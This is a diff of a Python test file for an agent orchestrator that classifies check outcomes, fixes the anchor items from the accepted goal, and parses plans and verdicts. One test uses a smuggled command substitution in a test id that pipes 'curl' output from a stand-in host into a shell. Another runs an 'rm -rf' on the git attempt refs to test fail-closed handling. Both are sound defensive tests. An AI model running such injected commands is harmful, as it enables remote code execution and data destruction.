@@ -40,7 +40,8 @@ from attempt_ws import BASH, GIT, REPO_ROOT, ContainerWS, LocalWS, daemon_frame
 
 ROOT = Path(__file__).resolve().parents[1]
 REPO = "https://github.com/acme/gym.git"
-GOAL = "greet and say farewell"
+# the ACCEPTED goal: its list lines are the effort's fixed anchor items A1, A2 (round 3)
+GOAL = "- greet() returns a greeting\n- farewell() exists"
 CONTENT_MARK = "CONTENTMARK_93f1"     # file content: must never reach audit or notes
 CMD_MARK = "CMDMARK_5521"             # worker check command text: same
 
@@ -258,11 +259,13 @@ async def scenario_discard(orch, ws):
     assert CONTENT_MARK in ws.git("show", f"{ref}:a.py") and CONTENT_MARK in ws.git("show", f"{ref}:b.py")
     # R1: test_old passed at the start = regression; test_added is NEW (same, existing file)
     facts = (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
-    assert [f["test"] for f in facts["regression"]] == ["t.py::test_old"]
-    assert [f["test"] for f in facts["new_not_passing"]] == ["t.py::test_added"]
-    assert {f["anchor"] for f in facts["regression"] + facts["new_not_passing"]} == {"A1"}
+    # the FACT is check-level: c1 passed at the start, fails now
+    assert [(c["check"], c["outcome"], c["anchor"]) for c in facts["checks"]] == [("c1", "regression", "A1")]
+    assert facts["checks"][0]["start"] == "PASS" and facts["checks"][0]["now"].startswith("FAIL")
+    # optional per-test detail (R1 kept): test_old regressed, test_added (same file) is new
+    assert facts["tests"]["regressed"] == ["t.py::test_old"] and facts["tests"]["new"] == ["t.py::test_added"]
     plan_prompt = [w for w in orch.harness.wakes if w["plan_only"]][-1]["prompt"]
-    assert "REGRESSIONS" in plan_prompt and "VERDICT" in plan_prompt and "anchor" in plan_prompt
+    assert "REGRESSION (passed at the start" in plan_prompt and "VERDICT" in plan_prompt and "anchor" in plan_prompt
     notes = await _notes(orch, eid)
     assert len(notes) == 1
     note = notes[0]
@@ -352,17 +355,18 @@ async def scenario_big_output(orch, ws):
     def coding(w):
         _edits(w)
         w.write("big1.sh", start.replace(f"{long}377 PASSED", f"{long}377 FAILED")
-                + "head -c 300000 /dev/zero | tr '\\0' 'y'\necho\n")
+                + "head -c 300000 /dev/zero | tr '\\0' 'y'\necho\nexit 1\n")
         w.write("big2.sh", start.replace("behaviour", "contract").replace(
-            "contract.py::test_case_5 PASSED", "contract.py::test_case_5 FAILED"))
+            "contract.py::test_case_5 PASSED", "contract.py::test_case_5 FAILED") + "exit 1\n")
 
     await _code(orch, eid, chan, root, coding,
                 _checks_reply("step 1: sh big1.sh", "step 2: sh big2.sh"))
     await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
     facts = (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
-    assert facts["untrusted_checks"] == []
+    assert facts["n_untrusted"] == 0
     assert facts["n_regression"] == 2
-    got = sorted(f["test"].rsplit("_", 1)[-1] for f in facts["regression"])
+    assert [c["outcome"] for c in facts["checks"]] == ["regression", "regression"]
+    got = sorted(t.rsplit("_", 1)[-1] for t in facts["tests"]["regressed"])
     assert got == ["377", "5"]
     _no_denials(ws)
     return eid
@@ -413,6 +417,95 @@ async def scenario_branch_moving_discard(orch, ws):
     assert CONTENT_MARK in ws.git("show", f"{_a().ref_name(eid, 1)}:a.py")
     _no_denials(ws)
     return eid
+
+
+async def _facts_after(orch, ws, eid, chan, root, coding, reply, verdict="KEEP 1,2"):
+    await _code(orch, eid, chan, root, coding, reply)
+    await _gate(orch, eid, chan, root, _plan_next(verdict))
+    return (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
+
+
+async def scenario_new_test_file(orch, ws):
+    """F1: the worker adds a NEW test file and checks it alone (pytest-shaped output, exit 1):
+    not a regression, not 'start not measurable' - a new check, not passing."""
+    _base(ws)
+    eid, chan, root = await _effort(orch)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+
+    def coding(w):
+        _edits(w)
+        w.write("t_new.sh", "echo 't_new.py::test_greet FAILED'\necho 't_new.py::test_bye FAILED'\nexit 1\n")
+
+    facts = await _facts_after(orch, ws, eid, chan, root, coding, _checks_reply("step 1: sh t_new.sh"))
+    assert [c["outcome"] for c in facts["checks"]] == ["new_not_passing"]
+    assert facts["n_regression"] == 0 and facts["n_could_not_run_at_start"] == 0
+    return eid
+
+
+async def scenario_dotnet_and_shell(orch, ws):
+    """F2: dotnet-test-shaped and plain-shell checks. c1 (dotnet) fails at the start AND now -
+    still failing, its Adds test regressing visible as per-test detail; c2 (dotnet) passed at
+    the start and fails now - REGRESSION; c3 (shell, no test lines) fails both - still failing;
+    c4 (shell) failed at the start, passes now - fixed. Every check's pass/fail is in the prompt."""
+    _base(ws)
+    eid, chan, root = await _effort(orch)
+    ws.write("dn1.sh", "echo '  Passed Calc.Tests.AddTests.Adds [1 ms]'\n"
+                       "echo '  Failed Calc.Tests.AddTests.Subtracts [2 ms]'\nexit 1\n")
+    ws.write("dn2.sh", "echo '  Passed Calc.Tests.MulTests.Muls [1 ms]'\n"
+                       "echo 'Passed!  - Failed: 0, Passed: 1'\nexit 0\n")
+    ws.write("sh3.sh", "echo broken; exit 3\n")
+    ws.write("sh4.sh", "exit 1\n")
+    ws.git("add", "-A")
+    ws.git("commit", "-q", "-m", "checks")
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+
+    def coding(w):
+        _edits(w)
+        w.write("dn1.sh", "echo '  Failed Calc.Tests.AddTests.Adds [1 ms]'\n"
+                          "echo '  Failed Calc.Tests.AddTests.Subtracts [2 ms]'\nexit 1\n")
+        w.write("dn2.sh", "echo '  Failed Calc.Tests.MulTests.Muls [1 ms]'\nexit 1\n")
+        w.write("sh4.sh", "exit 0\n")
+
+    facts = await _facts_after(orch, ws, eid, chan, root, coding, _checks_reply(
+        "step 1: sh dn1.sh", "step 1: sh dn2.sh", "step 2: sh sh3.sh", "step 2: sh sh4.sh"))
+    assert [c["outcome"] for c in facts["checks"]] == ["still_failing", "regression",
+                                                       "still_failing", "fixed"]
+    assert facts["checks"][2]["start"] == "FAIL (exit 3)" and facts["checks"][2]["now"] == "FAIL (exit 3)"
+    assert "Calc.Tests.AddTests.Adds" in facts["tests"]["regressed"]
+    prompt = [w for w in orch.harness.wakes if w["plan_only"]][-1]["prompt"]
+    for k in (1, 2, 3, 4):
+        assert f"check c{k} " in prompt
+    assert "REGRESSION (passed at the start, fails now)" in prompt and "FIXED" in prompt
+    return eid
+
+
+async def scenario_fail_and_hang_both_times(orch, ws):
+    """F2: a check that hangs at the start AND now is reported HANG (and killed); one that fails
+    both times is still failing; the gate-wide budget stops later checks (not_run)."""
+    _base(ws)
+    eid, chan, root = await _effort(orch)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+    facts = await _facts_after(orch, ws, eid, chan, root, _edits, _checks_reply(
+        "step 1: sleep 600", "step 1: false", "step 2: sleep 600", "step 2: true"))
+    out = [c["outcome"] for c in facts["checks"]]
+    assert out[0] == "hang" and facts["checks"][0]["start"] == "HANG"
+    assert out[1] == "still_failing"
+    assert "not_run" in out[2:]                 # the gate-wide budget ran out
+    assert ws.git("status", "--porcelain").strip() == ""
+    return eid
+
+
+@pytest.fixture(autouse=True)
+def _short_check_timeouts(monkeypatch):
+    """Checks that hang must not cost minutes in a test: 4 s per run, kill after 1 s more, and a
+    gate-wide budget that covers two such checks (2 runs each) but not a third."""
+    try:
+        att = _a()
+    except ImportError:          # the pre-fix base: no module (the base-compatible cases still run)
+        return
+    monkeypatch.setattr(att, "CHECK_TIMEOUT_S", 4)
+    monkeypatch.setattr(att, "CHECK_KILL_S", 1)
+    monkeypatch.setattr(att, "CHECKS_BUDGET_S", 60)
 
 
 async def _run(db_url, ws, scenario):
@@ -607,8 +700,7 @@ async def test_case7_three_discards_of_one_step_escalate_once_with_context(db_ur
         for i in range(4):
             await _code(orch, eid, chan, root,
                         lambda w, i=i: w.write("a.py", f"attempt {i} {CONTENT_MARK}\n"))
-            # the re-plan RENUMBERS the greet item (A7, same text) from round 2 on
-            plan = PLAN_1 if i == 0 else PLAN_1.replace("A1:", "A7:").replace("anchor: A1", "anchor: A7")
+            plan = PLAN_1
             results.append(await _gate(
                 orch, eid, chan, root,
                 plan + f"\nVERDICT: DISCARD 1 no-solution: try {i} did not make greet return a greeting"))
@@ -617,6 +709,7 @@ async def test_case7_three_discards_of_one_step_escalate_once_with_context(db_ur
         assert results[2] is None                       # the third discard escalated
         esc = await _events(orch, eid, "attempt_step_escalated")
         assert len(esc) == 1
+        assert await orch._event_count(eid, "worker_plan_stopped") == 1     # the escalation stops
         p = esc[0]["payload"]
         assert p["anchor"] == "A1" and p["discards"] == 3 and p["class"] == "no-solution-identified"
         assert len(p["attempts"]) == 3 and all(r.startswith("ao-attempts/") for r in p["refs"])
@@ -642,12 +735,48 @@ async def test_case7_notes_are_capped_in_count(db_url, tmp_path):
         await _shutdown(orch, db)
 
 
-def test_case7_items_are_canonical_across_re_plans():
+def test_case7_anchor_items_are_derived_from_the_accepted_goal():
     att = _a()
-    merged, alias = att.canonical_items({"A1": "greet works"}, {"A3": "Greet works.", "A1": "other",
-                                                                "A2": "new thing"})
-    assert merged == {"A1": "greet works", "A2": "new thing"}
-    assert alias == {"A3": "A1", "A1": "A1", "A2": "A2"}
+    assert att.derive_items(GOAL) == {"A1": "greet() returns a greeting", "A2": "farewell() exists"}
+    assert att.derive_items("Add a CLI. It lists todos. It deletes them.") == {
+        "A1": "Add a CLI.", "A2": "It lists todos.", "A3": "It deletes them."}
+    assert att.derive_items("fix it") == {"A1": "fix it"}
+    # injected blocks never become items
+    assert att.derive_items("do x and y\n\nLEARNED CONSTRAINTS (1)\n  1. z") == {"A1": "do x and y"}
+
+
+async def test_case7_a_replan_cannot_redefine_or_renumber_an_anchor_item(db_url, tmp_path):
+    """F3: the items are fixed when the effort is accepted (goal version 1). A re-plan that writes
+    its own ANCHOR ITEMS (`A1: farewell() exists`) changes nothing: A1 still names greet, a step
+    tagged A1 serves greet, the note is framed against greet; a made-up id is refused."""
+    ws = LocalWS(tmp_path)
+    _base(ws)
+    orch, db = await _orch(db_url)
+    _wire(orch, ws)
+    try:
+        eid, chan, root = await _effort(orch)
+        fixed = await orch._effort_anchor_items(eid)
+        assert fixed == {"A1": "greet() returns a greeting", "A2": "farewell() exists"}
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits)
+        replan = ("UNDERSTANDING: farewell left\nANCHOR ITEMS:\nA1: farewell() exists\n"
+                  "PLAN:\n1. add b.py with farewell [anchor: A1]\nWON'T DO: x\nRISKS: none\n"
+                  "VERDICT: KEEP 1-2")
+        assert await _gate(orch, eid, chan, root, replan) is not None
+        assert await orch._effort_anchor_items(eid) == fixed
+        plan = await orch._effort_plan_row(eid)
+        assert plan["items"] == fixed and plan["steps"][0]["anchor"] == "A1"
+        await _code(orch, eid, chan, root, lambda w: w.write("b.py", f"broken {CONTENT_MARK}\n"))
+        assert await _gate(orch, eid, chan, root,
+                           replan.replace("KEEP 1-2", "DISCARD 1 no-solution: farewell still missing")) is not None
+        notes = await _notes(orch, eid)
+        assert notes and "anchor item A1 (greet() returns a greeting)" in notes[-1]
+        # an id the effort does not have is refused (once, then stop)
+        made_up = replan.replace("[anchor: A1]", "[anchor: A9]").replace("VERDICT: KEEP 1-2", "")
+        assert await _gate(orch, eid, chan, root, made_up, made_up) is None
+        assert await orch._event_count(eid, "plan_steps_undeclared") == 2
+    finally:
+        await _shutdown(orch, db)
 
 
 # ── Case 8: refs expire at delivery ───────────────────────────────────────────────────────────
@@ -800,7 +929,7 @@ def test_case10_truncated_or_missing_markers_are_untrusted():
 def test_case10_an_untrusted_check_is_reported_as_unknown_never_as_no_regression():
     att = _a()
     f = att.classify([{"step": 1, "cmd": "x"}], [None], [{"n": 1, "anchor": "A1"}])
-    assert f["untrusted_checks"] == ["c1"]
+    assert f["n_untrusted"] == 1 and f["checks"][0]["outcome"] == "untrusted"
     assert "UNKNOWN, not absent" in att.facts_text(f, None, [{"n": 1, "anchor": "A1"}],
                                                    [{"step": 1, "cmd": "x"}])
 
@@ -813,6 +942,8 @@ def test_case11_verdict_grammar_is_strict():
     assert att.parse_verdict("VERDICT: KEEP steps 1 and 2", steps).steps == [1, 2]
     assert att.parse_verdict("VERDICT: KEEP 1-3", steps).steps == [1, 2, 3]
     assert att.parse_verdict("VERDICT: KEEP 1-2 - both done", steps).steps == [1, 2]
+    assert att.parse_verdict("VERDICT: KEEP 1 - 2", steps).steps == [1, 2]
+    assert att.parse_verdict("VERDICT: KEEP 1 - done", steps).steps == [1]
     v = att.parse_verdict("VERDICT: DISCARD 2 deviation: broke A2", steps)
     assert (v.kind, v.steps, v.klass, v.reason) == ("discard", [2], "deviation", "broke A2")
     for bad in ("", "VERDICT: KEEP 4", "VERDICT: DISCARD 1", "VERDICT: KEEP", "VERDICT: KEEP 3-1",
@@ -830,67 +961,64 @@ def test_case11_plan_grammar_requires_an_anchor_per_step():
     assert att.parse_plan("PLAN: nothing remains").nothing_remains
 
 
-def _run_of(att, rca, rcb, start_lines, end_lines):
-    """A CheckRun as the shell would compute it (used to pin the classifier's meaning)."""
-    def split(lines):
-        f, p = set(), set()
-        for st, tid in lines:
-            (f if st == "FAILED" else p).add(tid)
-        return f, p - f
-    fa, pa = split(end_lines)
-    fb, pb = split(start_lines) if start_lines is not None else (set(), set())
-    stat = {t: "F" for t in fb} | {t: "P" for t in pb}
-    j = [(stat.get(t, "A") if start_lines else "U", t) for t in sorted(fa)]
-    order = {"P": 0, "A": 1, "F": 2, "U": 3}
-    j.sort(key=lambda x: order[x[0]])
-    counts = {"NFA": len(fa), "NPA": len(pa), "NFB": len(fb), "NPB": len(pb),
-              "NREG": sum(1 for s, _ in j if s == "P"), "NNEW": sum(1 for s, _ in j if s == "A"),
-              "NSTILL": sum(1 for s, _ in j if s == "F"), "NUNK": sum(1 for s, _ in j if s == "U"),
-              "NFIX": len(fb & pa)}
-    return att.CheckRun(rca=rca, rcb=rcb, counts=counts, listed=j, fixed=sorted(fb & pa),
-                        state=att.State("a" * 40, "main", 0, None))
+def _cr(att, rca, rcb, listed=(), counts=None):
+    c = {"NFA": 0, "NPA": 0, "NFB": 0, "NPB": 0, "NREG": 0, "NNEW": 0, "NSTILL": 0, "NUNK": 0,
+         "NFIX": 0}
+    c.update(counts or {})
+    return att.CheckRun(rca=rca, rcb=rcb, counts=c, listed=list(listed), fixed=[],
+                        state=att.State("a" * 40, "main", 0, None), start_checked_out=rcb is not None)
 
 
-def test_case11_facts_new_test_in_an_existing_file_and_a_renamed_test_are_not_regressions():
+def test_case11_check_level_outcomes_are_framework_agnostic():
     att = _a()
-    checks = [{"step": 1, "cmd": "pytest -v t.py"}]
     steps = [{"n": 1, "anchor": "A1"}]
-    # R1: test_added lives in the SAME existing file; the start ran clean
-    r = _run_of(att, 1, 0, [("PASSED", "t.py::test_old")],
-                [("PASSED", "t.py::test_old"), ("FAILED", "t.py::test_added")])
-    f = att.classify(checks, [r], steps)
-    assert f["regression"] == [] and [x["test"] for x in f["new_not_passing"]] == ["t.py::test_added"]
-    # renamed: test_a (passing) became test_b (failing): new, not a regression; count drop shown
-    r = _run_of(att, 1, 0, [("PASSED", "t.py::test_a"), ("PASSED", "t.py::test_k")],
-                [("FAILED", "t.py::test_b"), ("PASSED", "t.py::test_k")])
-    f = att.classify(checks, [r], steps)
-    assert f["regression"] == [] and [x["test"] for x in f["new_not_passing"]] == ["t.py::test_b"]
-    assert "passing tests 2 at the start, 1 now" in att.facts_text(f, None, steps, checks)
-    # a real regression, and the start not measurable
-    r = _run_of(att, 1, 0, [("PASSED", "t.py::a"), ("FAILED", "t.py::b")],
-                [("FAILED", "t.py::a"), ("FAILED", "t.py::b")])
-    f = att.classify(checks, [r], steps)
-    assert [x["test"] for x in f["regression"]] == ["t.py::a"]
-    assert [x["test"] for x in f["still_failing"]] == ["t.py::b"]
-    assert all(x["anchor"] == "A1" for x in f["regression"])
-    r = _run_of(att, 1, None, None, [("FAILED", "t.py::a")])
-    f = att.classify(checks, [r], steps)
-    assert f["regression"] == [] and f["n_unknown_before"] == 1
+    cases = [
+        ("make test", 1, 0, [], "regression"),
+        ("make test", 0, 1, [], "fixed"),
+        ("make test", 2, 2, [], "still_failing"),
+        ("make test", 0, 0, [], "passing"),
+        ("make test", 124, 0, [], "hang"),
+        ("make test", 137, 124, [], "hang"),
+        ("make test", 1, None, [], "could_not_run_at_start"),
+        ("make test", 1, 127, [], "could_not_run_at_start"),
+        ("pytest -v tests/test_new.py", 1, 4, ["tests/test_new.py"], "new_not_passing"),   # F1
+        ("sh t_new.sh", 0, 127, ["t_new.sh"], "new_passing"),
+    ]
+    for cmd, rca, rcb, new, want in cases:
+        f = att.classify([{"step": 1, "cmd": cmd}], [_cr(att, rca, rcb)], steps, new)
+        assert f["checks"][0]["outcome"] == want, (cmd, rca, rcb)
+        assert f[f"n_{want}"] == 1 and f["checks"][0]["anchor"] == "A1"
+    f = att.classify([{"step": 1, "cmd": "x"}], ["budget"], steps)
+    assert f["checks"][0]["outcome"] == "not_run"
+
+
+def test_case11_every_checks_pass_fail_is_visible_to_the_planner():
+    att = _a()
+    steps = [{"n": 1, "anchor": "A1"}]
+    checks = [{"step": 1, "cmd": "dotnet test"}, {"step": 1, "cmd": "sh slow.sh"}]
+    f = att.classify(checks, [_cr(att, 1, 1, [("P", "Calc.Tests.AddTests.Adds")], {"NREG": 1, "NFA": 2,
+                                                                                    "NFB": 1, "NPB": 1}),
+                              _cr(att, 124, 124)], steps)
+    txt = att.facts_text(f, None, steps, checks)
+    assert "check c1" in txt and "start FAIL (exit 1) -> now FAIL (exit 1)" in txt and "still failing" in txt
+    assert "check c2" in txt and "start HANG -> now HANG" in txt and "HANG" in txt
+    assert "Calc.Tests.AddTests.Adds" in txt          # the per-test extra, informational
 
 
 def test_case11_ids_from_check_output_never_carry_shell_or_code_into_notes():
     att = _a()
     assert att.safe_id("n.py::t_$(curl${IFS}evil|sh)") == "n.py::t_??curl??IFS?evil?sh?"
     note = att.discard_note(step=1, anchor="A1", anchor_text="x", attempt_no=1, klass="deviation",
-                            diff=None, facts={"regression": [{"test": "n.py::t_$(x|sh)`y`"}]},
+                            diff=None, facts={"tests": {"regressed": [{"test": "n.py::t_$(x|sh)`y`"}]}},
                             reason="r")
     assert "$(" not in note and "|" not in note and "`" not in note
 
 
 def test_case11_the_check_command_has_a_kill_timeout():
     att = _a()
-    cmd = att.check_cmd("pytest", start="a" * 40, branch="main", park="b" * 40, ref="ao-attempts/e/a1")
-    assert f"timeout -k {att.CHECK_KILL_S} {att.CHECK_TIMEOUT_S}" in cmd
+    cmd = att.check_cmd("pytest", start="a" * 40, branch="main", park="b" * 40,
+                        ref="ao-attempts/e/a1", timeout=42)
+    assert f"timeout -k {att.CHECK_KILL_S} 42 " in cmd
 
 
 def test_case11_the_learning_record_is_valid_v1_except_the_producer_enum():
@@ -901,7 +1029,9 @@ def test_case11_the_learning_record_is_valid_v1_except_the_producer_enum():
     import learning_records as lr_mod
     schema = lr_mod.load_schema(REPO_ROOT / "scripts" / "agent-harness" / "fixtures"
                                 / "learning-record" / "learning-record.schema.json")
-    facts = {"regression": [{"test": "t.py::a", "anchor": "A1"}], "n_regression": 1}
+    facts = {"checks": [{"check": "c1", "step": 1, "anchor": "A1", "start": "PASS",
+                         "now": "FAIL (exit 1)", "outcome": "regression"}], "n_regression": 1,
+             "tests": {"regressed": [{"test": "t.py::a"}]}}
     rec = att.learning_record(effort_id="e1", attempt_id="e1:a1", ref="ao-attempts/e1/a1",
                               anchor="A1", anchor_text="greet", note="the note", facts=facts,
                               klass="deviation", created_at="2026-10-11T00:00:00Z")
@@ -935,7 +1065,10 @@ async def test_case13_a_check_that_deletes_the_attempt_ref_fails_closed(db_url, 
         assert await _gate(orch, eid, chan, root, PLAN_1) is not None
         await _code(orch, eid, chan, root, _edits,
                     _checks_reply("step 1: rm -rf .git/refs/heads/ao-attempts"))
-        await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: x for A1"))
+        n_wakes = len(orch.harness.wakes)
+        assert await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: x for A1")) is None
+        assert len(orch.harness.wakes) == n_wakes            # stopped BEFORE any plan turn
+        assert await orch._event_count(eid, "worker_plan_stopped") == 1
         assert await orch._event_count(eid, "attempt_restore_failed") == 1
         assert await orch._event_count(eid, "attempt_discarded") == 0
         assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")   # not lost
@@ -945,6 +1078,7 @@ async def test_case13_a_check_that_deletes_the_attempt_ref_fails_closed(db_url, 
 
 # ── Case 12: the real little-coder-open-terminal image, offline ──────────────────────────────
 _REAL = [scenario_keep, scenario_discard, scenario_plan_writes, scenario_big_output,
+         scenario_new_test_file, scenario_dotnet_and_shell, scenario_fail_and_hang_both_times,
          scenario_branch_moving_checks, scenario_branch_moving_discard]
 
 
@@ -961,3 +1095,85 @@ async def test_case12_real_open_terminal_image(db_url, scenario):
 @pytest.mark.parametrize("run", sorted(C7A_RUNS))
 async def test_case12_real_image_c7a_replay(db_url, run):
     await _c7a(db_url, ContainerWS(_CONTAINER, _KEY), run)
+
+
+# ── Case 16: round-3 minors ────────────────────────────────────────────────────────────────────
+async def test_case16_new_test_file_checked_alone(db_url, tmp_path):
+    await _run(db_url, LocalWS(tmp_path), scenario_new_test_file)
+
+
+async def test_case16_dotnet_and_shell_checks(db_url, tmp_path):
+    await _run(db_url, LocalWS(tmp_path), scenario_dotnet_and_shell)
+
+
+async def test_case16_fail_and_hang_both_times_within_a_gate_budget(db_url, tmp_path):
+    await _run(db_url, LocalWS(tmp_path), scenario_fail_and_hang_both_times)
+
+
+async def test_case16_a_salvage_ref_moved_by_checkout_B_is_detected_and_repaired(db_url, tmp_path):
+    """`git checkout -B <ref> <sha>` is proxy-legal (allow:checkout): run THROUGH the proxy shim
+    by a later plan turn after a discard - detected, audited, pointed back at the attempt."""
+    att = _a()
+    ws = LocalWS(tmp_path)
+    s0 = _base(ws)
+    br = _branch(ws)
+    orch, db = await _orch(db_url)
+    _wire(orch, ws)
+    try:
+        eid, chan, root = await _effort(orch)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits)
+        await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: wrong for A1"))
+        ref = att.ref_name(eid, 1)
+        park = ws.git("rev-parse", ref).strip()
+
+        def plan_moves_ref(w):
+            w.bridge(f"cd /workspace && git checkout -q -B {ref} {s0} && git checkout -q {br}")
+
+        orch._plan_actions.append(plan_moves_ref)
+        await _gate(orch, eid, chan, root, _plan_next(""))
+        moved = await _events(orch, eid, "attempt_ref_moved")
+        assert moved and moved[-1]["payload"]["ref"] == ref and moved[-1]["payload"]["repaired"] is True
+        assert ws.git("rev-parse", ref).strip() == park and CONTENT_MARK in ws.git("show", f"{ref}:a.py")
+        assert _branch(ws) == br and ws.git("status", "--porcelain").strip() == ""
+        _no_denials(ws)
+    finally:
+        await _shutdown(orch, db)
+
+
+async def test_case16_long_test_ids_are_compared_in_full_never_merged(db_url, tmp_path):
+    """Two parametrized tests sharing a 170-char prefix: A passed at the start, B failed; both
+    fail now. A is a regression, B still failing (round 2 cut ids before comparing and merged them)."""
+    ws = LocalWS(tmp_path)
+    _base(ws)
+    pre = "t.py::test_" + "p" * 170
+    ws.write("long.sh", f"echo '{pre}[A] PASSED'\necho '{pre}[B] FAILED'\nexit 1\n")
+    ws.git("add", "-A")
+    ws.git("commit", "-q", "-m", "long")
+    orch, db = await _orch(db_url)
+    _wire(orch, ws)
+    try:
+        eid, chan, root = await _effort(orch)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        facts = await _facts_after(orch, ws, eid, chan, root, lambda w: (_edits(w), w.write(
+            "long.sh", f"echo '{pre}[A] FAILED'\necho '{pre}[B] FAILED'\nexit 1\n")),
+            _checks_reply("step 1: sh long.sh"))
+        assert facts["tests_counts"]["regressed"] == 1 and facts["tests_counts"]["still_failing"] == 1
+        shown = facts["tests"]["regressed"][0]
+        assert "~" in shown and len(shown) < 200
+    finally:
+        await _shutdown(orch, db)
+
+
+async def test_case16_anchor_items_are_stored_at_intake(db_url):
+    """The accepted goal (goal version 1, set at intake) fixes the items; a later goal version
+    (an iteration) does not change them."""
+    orch, db = await _orch(db_url)
+    try:
+        eid, _c, _r = await _effort(orch)
+        plan = await orch._effort_plan_row(eid)
+        assert plan["items"] == {"A1": "greet() returns a greeting", "A2": "farewell() exists"}
+        await orch.charters.set_goal(eid, "- something else entirely", created_by="po")
+        assert await orch._effort_anchor_items(eid) == plan["items"]
+    finally:
+        await _shutdown(orch, db)
